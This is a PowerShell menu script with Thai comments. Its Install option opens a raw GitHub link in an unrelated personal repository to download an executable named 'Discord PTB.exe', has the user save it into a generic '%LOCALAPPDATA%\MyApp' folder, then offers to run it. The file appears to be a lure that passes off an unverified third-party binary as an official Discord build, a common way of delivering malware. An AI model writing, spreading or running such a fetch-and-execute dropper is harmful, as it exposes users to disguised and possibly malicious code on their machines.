[Console]::OutputEncoding = [Text.Encoding]::UTF8
cls

# -------------------------
# CONFIG
# -------------------------

$global:TargetDir  = Join-Path $env:LOCALAPPDATA "MyApp"
$global:TargetName = "Discord PTB.exe"
$global:TargetFile = Join-Path $global:TargetDir $global:TargetName

$global:DownloadUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/Discord%20PTB.exe"

# -------------------------
# ANIMATION
# -------------------------

function chk($t){
    $c = @("Red","Yellow","Green","Cyan","Blue","Magenta")
    for($i=0;$i -lt 20;$i++){
        $d="."*($i%6)
        $cl=$c[$i%$c.Count]
        Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl
        Start-Sleep -Milliseconds 80
    }
    Write-Host ""
}

# -------------------------
# PREPARE FOLDER
# -------------------------

function Prepare-Folder {
    if(-not (Test-Path $global:TargetDir)){
        New-Item -ItemType Directory -Path $global:TargetDir -Force | Out-Null
    }
}

# -------------------------
# INSTALL
# -------------------------

function Install-App {

    Prepare-Folder

    chk "opening download "

    # เปิดลิงก์ให้โหลดเอง
    Start-Process $global:DownloadUrl

    Write-Host "`nDownload page opened." -ForegroundColor Green
    Write-Host "Save file to:" -ForegroundColor Cyan
    Write-Host $global:TargetFile -ForegroundColor White

    # รอผู้ใช้
    Pause

    # ถามรัน
    if(Test-Path $global:TargetFile){

        $ans = Read-Host "`nRun now? (y/n)"

        if($ans -eq "y"){
            Write-Host "`nRunning..." -ForegroundColor Cyan
            Start-Process $global:TargetFile
        }
    }
    else{
        Write-Host "`nFile not found (you may not have downloaded yet)" -ForegroundColor Red
    }

    Pause
}

# -------------------------
# CHECK
# -------------------------

function Check-App {

    Prepare-Folder

    Write-Host "`nChecking..." -ForegroundColor Yellow

    if(Test-Path $global:TargetFile){
        Write-Host "`nFile found" -ForegroundColor Green
        Write-Host $global:TargetFile -ForegroundColor Cyan
    }
    else{
        Write-Host "`nFile not found" -ForegroundColor Red
    }

    Pause
}

# -------------------------
# MENU
# -------------------------

while($true){

    cls
    Write-Host "=== MENU ===`n" -ForegroundColor Cyan
    Write-Host "1. Install"
    Write-Host "2. Check"
    Write-Host "0. Exit"

    $m = Read-Host ">"

    switch($m){
        "1" { Install-App }
        "2" { Check-App }
        "0" { break }
        default { continue }
    }
}
